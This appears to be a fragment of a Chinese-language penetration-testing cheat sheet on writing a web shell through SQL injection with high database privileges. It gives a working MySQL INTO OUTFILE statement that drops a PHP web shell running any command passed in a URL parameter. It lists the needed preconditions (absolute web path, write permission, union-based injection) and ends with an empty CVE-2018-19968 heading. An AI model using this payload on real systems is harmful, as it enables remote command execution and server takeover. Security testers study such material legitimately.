# 高权限直接写shell
```
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php";
```
需要满足的条件
- 网站的绝对路径。
- 拥有可写权限
- 是union注入()
# CVE-2018-19968
